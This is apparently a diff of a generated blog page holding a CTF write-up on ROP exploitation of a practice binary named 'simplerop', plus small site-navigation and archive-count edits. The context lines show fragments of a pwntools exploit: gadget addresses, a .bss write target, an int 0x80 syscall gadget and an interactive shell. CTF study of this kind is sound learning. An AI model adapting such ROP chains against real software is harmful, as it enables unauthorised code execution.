@@ -608,7 +608,7 @@ payload <span class="token operator">+=</span> p32<span class="token punctuation
 sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'simplerop'</span><span class="token punctuation">)</span>
 pop_edx_ret<span class="token operator">=</span><span class="token number">0x0806e82a</span> 
 pop_eax_ret<span class="token operator">=</span><span class="token number">0x080bae06</span> 
-data_addr<span class="token operator">=</span><span class="token number">0x080ea060</span> 
+data_addr<span class="token operator">=</span><span class="token number">0x080ea060</span>  <span class="token comment" spellcheck="true">#elf.bss()获取</span>
 pop_edx_ecx_ebx_ret<span class="token operator">=</span><span class="token number">0x0806e850</span> 
 mov_ret<span class="token operator">=</span><span class="token number">0x0809a15d</span> 
 int_0x80_addr <span class="token operator">=</span> <span class="token number">0x080493e1</span> 
@@ -660,6 +660,14 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
+    
+        <a href="/2018/07/12/ROPEmporium-WriteUp/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
     
 </nav>
 
@@ -745,7 +753,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             </a>
             <ul class="dropdown-menu">
             <li>
-                <a class="sidebar_archives-link" href="/archives/2018/07/">七月 2018<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/04/">四月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/03/">三月 2017<span class="sidebar_archives-count">2</span></a>
+                <a class="sidebar_archives-link" href="/archives/2018/07/">七月 2018<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/04/">四月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/03/">三月 2017<span class="sidebar_archives-count">2</span></a>
             </ul>
         </li>
         
